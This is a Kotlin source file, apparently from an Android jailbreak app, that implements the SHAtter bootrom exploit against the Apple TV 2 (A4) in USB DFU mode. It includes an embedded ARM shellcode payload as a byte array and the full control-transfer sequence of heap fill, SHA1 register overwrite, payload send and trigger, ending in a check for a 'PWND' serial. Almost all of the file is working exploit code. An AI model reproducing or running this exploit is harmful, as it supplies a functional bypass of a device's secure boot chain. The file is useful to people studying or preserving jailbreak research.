package tv.blackb0x.droid

import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbManager

/**
 * SHAtter for AppleTV2,1 (A4 / CPID 0x8930).
 * Sequence matches ipwndfu: reset_counters, get_data, usb_reset, re-acquire,
 * request_image_validation (+reset), heap fill, SHA1 stage, payload with wValue=0.
 */
object Shatter {
    private val PAYLOAD = byteArrayOf(
        0x33.toByte(), 0x67.toByte(), 0x6d.toByte(), 0x49.toByte(), 0x58.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x44.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x2c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x73.toByte(), 0x73.toByte(), 0x62.toByte(), 0x69.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0x99.toByte(), 0xf1.toByte(), 0x02.toByte(), 0x84.toByte(), 0x48.toByte(), 0x53.toByte(), 0x48.toByte(), 0x53.toByte(), 0x0c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x54.toByte(), 0x52.toByte(), 0x45.toByte(), 0x43.toByte(), 0x0c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x20.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x3f.toByte(), 0x41.toByte(), 0x80.toByte(), 0x22.toByte(),
        0x48.toByte(), 0xf2.toByte(), 0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x52.toByte(), 0x48.toByte(), 0x52.toByte(), 0x49.toByte(), 0x4f.toByte(), 0xf4.toByte(),
        0xa0.toByte(), 0x72.toByte(), 0x48.toByte(), 0xf2.toByte(), 0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x47.toByte(), 0xf2.toByte(), 0x2d.toByte(), 0x13.toByte(),
        0x98.toByte(), 0x47.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0xc9.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x79.toByte(), 0x46.toByte(), 0x04.toByte(), 0x39.toByte(),
        0x4c.toByte(), 0x48.toByte(), 0x88.toByte(), 0x42.toByte(), 0x07.toByte(), 0xd0.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x80.toByte(), 0x62.toByte(), 0x48.toByte(), 0xf2.toByte(),
        0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x48.toByte(), 0x4b.toByte(), 0x01.toByte(), 0x33.toByte(), 0x18.toByte(), 0x47.toByte(), 0x48.toByte(), 0x48.toByte(),
        0x0c.toByte(), 0x38.toByte(), 0x85.toByte(), 0x46.toByte(), 0x01.toByte(), 0x20.toByte(), 0x01.toByte(), 0x21.toByte(), 0x00.toByte(), 0x22.toByte(), 0x44.toByte(), 0xf6.toByte(),
        0x8d.toByte(), 0x63.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x20.toByte(), 0x46.toByte(), 0xf6.toByte(), 0x0d.toByte(), 0x13.toByte(), 0x98.toByte(), 0x47.toByte(),
        0x42.toByte(), 0x48.toByte(), 0x3a.toByte(), 0xa1.toByte(), 0x78.toByte(), 0x22.toByte(), 0x49.toByte(), 0xf2.toByte(), 0xc9.toByte(), 0x03.toByte(), 0x98.toByte(), 0x47.toByte(),
        0x44.toByte(), 0xf6.toByte(), 0x85.toByte(), 0x43.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x40.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x30.toByte(), 0x31.toByte(),
        0x98.toByte(), 0x47.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x3c.toByte(), 0x49.toByte(), 0x08.toByte(), 0x68.toByte(), 0x00.toByte(), 0x22.toByte(), 0x0a.toByte(), 0x60.toByte(),
        0x43.toByte(), 0xf6.toByte(), 0x95.toByte(), 0x33.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x2c.toByte(), 0xee.toByte(), 0xdb.toByte(), 0x4f.toByte(), 0xf0.toByte(),
        0x04.toByte(), 0x45.toByte(), 0x28.toByte(), 0x68.toByte(), 0x37.toByte(), 0x49.toByte(), 0x88.toByte(), 0x42.toByte(), 0x0f.toByte(), 0xd1.toByte(), 0xa8.toByte(), 0x68.toByte(),
        0xe9.toByte(), 0x68.toByte(), 0x2a.toByte(), 0x69.toByte(), 0x6b.toByte(), 0x69.toByte(), 0xac.toByte(), 0x69.toByte(), 0x00.toByte(), 0x94.toByte(), 0xec.toByte(), 0x69.toByte(),
        0x01.toByte(), 0x94.toByte(), 0x2c.toByte(), 0x6a.toByte(), 0x02.toByte(), 0x94.toByte(), 0x6c.toByte(), 0x68.toByte(), 0xa0.toByte(), 0x47.toByte(), 0x68.toByte(), 0x60.toByte(),
        0x00.toByte(), 0x21.toByte(), 0x29.toByte(), 0x60.toByte(), 0xd8.toByte(), 0xe7.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x40.toByte(), 0x21.toByte(), 0x1c.toByte(),
        0x00.toByte(), 0x22.toByte(), 0x47.toByte(), 0xf2.toByte(), 0x69.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x28.toByte(), 0xcf.toByte(), 0xd0.toByte(),
        0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x43.toByte(), 0x00.toByte(), 0x93.toByte(), 0x01.toByte(), 0x94.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x69.toByte(), 0x46.toByte(),
        0x01.toByte(), 0xaa.toByte(), 0x00.toByte(), 0xf0.toByte(), 0x0c.toByte(), 0xf8.toByte(), 0x28.toByte(), 0xb9.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x41.toByte(),
        0x00.toByte(), 0x22.toByte(), 0x45.toByte(), 0xf6.toByte(), 0x5d.toByte(), 0x23.toByte(), 0x98.toByte(), 0x47.toByte(), 0x20.toByte(), 0x1c.toByte(), 0x47.toByte(), 0xf2.toByte(),
        0x51.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0xba.toByte(), 0xe7.toByte(), 0xf0.toByte(), 0xb5.toByte(), 0x5e.toByte(), 0x46.toByte(), 0x55.toByte(), 0x46.toByte(),
        0x44.toByte(), 0x46.toByte(), 0x70.toByte(), 0xb4.toByte(), 0x06.toByte(), 0xaf.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x68.toByte(), 0x04.toByte(), 0x6d.toByte(), 0x46.toByte(),
        0x2d.toByte(), 0x1b.toByte(), 0xad.toByte(), 0x46.toByte(), 0x00.toByte(), 0x23.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x64.toByte(), 0x04.toByte(), 0x2c.toByte(), 0x19.toByte(),
        0x23.toByte(), 0x60.toByte(), 0x04.toByte(), 0x92.toByte(), 0x05.toByte(), 0x91.toByte(), 0x06.toByte(), 0x93.toByte(), 0x0e.toByte(), 0x68.toByte(), 0x8a.toByte(), 0x46.toByte(),
        0x9b.toByte(), 0x46.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x30.toByte(), 0x31.toByte(), 0x88.toByte(), 0x46.toByte(), 0x42.toByte(), 0x68.toByte(), 0x8a.toByte(), 0x42.toByte(),
        0x09.toByte(), 0xdc.toByte(), 0x90.toByte(), 0x46.toByte(), 0x20.toByte(), 0x1c.toByte(), 0x31.toByte(), 0x1c.toByte(), 0x44.toByte(), 0xf2.toByte(), 0x2d.toByte(), 0x14.toByte(),
        0xa0.toByte(), 0x47.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x44.toByte(), 0xf2.toByte(), 0xdb.toByte(), 0x63.toByte(), 0x14.toByte(), 0xb1.toByte(), 0x01.toByte(), 0x24.toByte(),
        0x44.toByte(), 0xf2.toByte(), 0xdb.toByte(), 0x73.toByte(), 0x18.toByte(), 0x47.toByte(), 0xc0.toByte(), 0x46.toByte(), 0x20.toByte(), 0x50.toByte(), 0x57.toByte(), 0x4e.toByte(),
        0x44.toByte(), 0x3a.toByte(), 0x5b.toByte(), 0x53.toByte(), 0x48.toByte(), 0x41.toByte(), 0x74.toByte(), 0x74.toByte(), 0x65.toByte(), 0x72.toByte(), 0x5d.toByte(), 0x00.toByte(),
        0x00.toByte(), 0xc0.toByte(), 0x02.toByte(), 0x84.toByte(), 0x00.toByte(), 0xc0.toByte(), 0x00.toByte(), 0xbf.toByte(), 0x00.toByte(), 0x98.toByte(), 0x03.toByte(), 0x84.toByte(),
        0x00.toByte(), 0xc0.toByte(), 0x03.toByte(), 0x84.toByte(), 0xe0.toByte(), 0xe0.toByte(), 0x02.toByte(), 0x84.toByte(), 0xcc.toByte(), 0xdb.toByte(), 0x02.toByte(), 0x84.toByte(),
        0x63.toByte(), 0x65.toByte(), 0x78.toByte(), 0x65.toByte()
    )

    fun run(
        usb: UsbManager,
        open: () -> Pair<UsbDevice, UsbDeviceConnection>?,
        log: (String) -> Unit,
        progress: (Double) -> Unit,
    ): Boolean {
        fun dfuPresent(): Boolean = usb.deviceList.values.any {
            it.vendorId == AppleUsb.VENDOR && it.productId == AppleUsb.PID_DFU
        }

        fun reopen(): UsbDeviceConnection? {
            val pair = open() ?: return null
            if (!AppleUsb.claim(pair.second, pair.first, configure = false)) {
                log("claimInterface failed")
                try { pair.second.close() } catch (_: Exception) {}
                return null
            }
            return pair.second
        }

        fun busReset(c: UsbDeviceConnection) {
            // resetDevice exists at runtime (API 24+) but some compile stubs omit it — reflect
            val ok = try {
                val m = UsbDeviceConnection::class.java.getMethod("resetDevice")
                (m.invoke(c) as? Boolean) == true
            } catch (_: Throwable) {
                false
            }
            log(if (ok) "usb reset" else "usb reset skipped")
            try { c.close() } catch (_: Exception) {}
            val until = System.currentTimeMillis() + 2500
            while (System.currentTimeMillis() < until && dfuPresent()) Thread.sleep(40)
            Thread.sleep(300)
        }

        log("Preparing buffer overflow")
        progress(5.0)
        var c = reopen() ?: return fail(log, "open failed")
        resetCounters(c)
        if (!getData(c, 0x40, log, strict = true)) {
            try { c.close() } catch (_: Exception) {}
            return fail(log, "getData 0x40")
        }
        progress(12.0)
        busReset(c)

        log("Requesting validation")
        c = reopen() ?: return fail(log, "open after reset")
        requestImageValidation(c)
        progress(20.0)
        busReset(c)

        log("Filling buffer")
        progress(25.0)
        c = reopen() ?: return fail(log, "open fill")
        val filled = getData(c, 0x2C000, log, strict = true) { done, total ->
            progress(25.0 + (done.toDouble() / total) * 12.0)
        }
        try { c.close() } catch (_: Exception) {}
        if (!filled) return fail(log, "heap fill failed — cable or OTG dropped")
        progress(40.0)
        Thread.sleep(500)

        log("Overwriting SHA1 registers")
        c = reopen() ?: return fail(log, "open sha1")
        resetCounters(c)
        if (!getData(c, 0x140, log, strict = true)) {
            try { c.close() } catch (_: Exception) {}
            return fail(log, "getData 0x140")
        }
        progress(50.0)
        busReset(c)

        log("Requesting validation")
        c = reopen() ?: return fail(log, "open validate2")
        requestImageValidation(c)
        progress(60.0)
        busReset(c)

        log("Sending SHAtter payload")
        progress(65.0)
        var sent = false
        c = reopen() ?: return fail(log, "open payload")
        for (attempt in 1..6) {
            if (attempt > 1) {
                log("payload retry $attempt")
                try { c.close() } catch (_: Exception) {}
                Thread.sleep(500)
                c = reopen() ?: continue
            }
            if (sendData(c, PAYLOAD, log)) {
                sent = true
                break
            }
        }
        if (!sent) {
            try { c.close() } catch (_: Exception) {}
            return fail(log, "payload send failed")
        }
        progress(85.0)
        log("Triggering overwrite")
        getData(c, 0x2C000, log, strict = false)
        try { c.close() } catch (_: Exception) {}
        Thread.sleep(800)
        progress(100.0)
        val serial = usb.deviceList.values.firstOrNull {
            it.vendorId == AppleUsb.VENDOR && it.productId == AppleUsb.PID_DFU
        }?.serialNumber ?: ""
        if (serial.isNotEmpty()) log(serial)
        if ("PWND" in serial) log("SHAtter successful")
        else log("SHAtter payload sent")
        return true
    }

    private fun fail(log: (String) -> Unit, msg: String): Boolean {
        log("SHAtter failed: $msg")
        return false
    }

    private fun resetCounters(c: UsbDeviceConnection) {
        c.controlTransfer(0x21, 4, 0, 0, ByteArray(0), 0, 1000)
    }

    private fun getData(
        c: UsbDeviceConnection,
        length: Int,
        log: (String) -> Unit,
        strict: Boolean,
        onProgress: ((Int, Int) -> Unit)? = null,
    ): Boolean {
        val packet = 0x800
        val buf = ByteArray(packet)
        var left = length
        var done = 0
        var packets = 0
        while (left > 0) {
            val n = minOf(packet, left)
            val r = c.controlTransfer(0xA1, 2, 0, 0, buf, n, if (strict) 2000 else 800)
            if (r != n) {
                if (!strict) {
                    log("getData ended at $done/$length r=$r")
                    return true
                }
                log("getData failed r=$r at $done/$length")
                return false
            }
            left -= n
            done += n
            packets++
            if (packets % 8 == 0) onProgress?.invoke(done, length)
        }
        return true
    }

    private fun requestImageValidation(c: UsbDeviceConnection) {
        c.controlTransfer(0x21, 1, 0, 0, ByteArray(0), 0, 1000)
        val blank = ByteArray(6)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
    }

    // ipwndfu send_data: wValue stays 0
    private fun sendData(c: UsbDeviceConnection, data: ByteArray, log: (String) -> Unit): Boolean {
        val packet = 0x800
        var sent = 0
        var part = 0
        while (sent < data.size) {
            val n = minOf(packet, data.size - sent)
            val chunk = ByteArray(n)
            System.arraycopy(data, sent, chunk, 0, n)
            val r = c.controlTransfer(0x21, 1, 0, 0, chunk, n, 5000)
            if (r != n) {
                log("payload send part $part r=$r wanted $n")
                return false
            }
            sent += n
            part++
        }
        log("payload ${data.size} bytes sent")
        return true
    }
}
